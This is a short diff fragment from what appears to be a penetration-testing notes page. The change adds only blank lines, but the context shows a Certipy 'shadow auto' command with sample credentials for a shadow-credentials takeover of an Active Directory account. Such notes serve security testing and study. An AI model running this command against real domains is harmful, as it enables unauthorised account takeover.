@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:25:46.493665+00:00'
 ```ps1
 certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
 ```
+
+
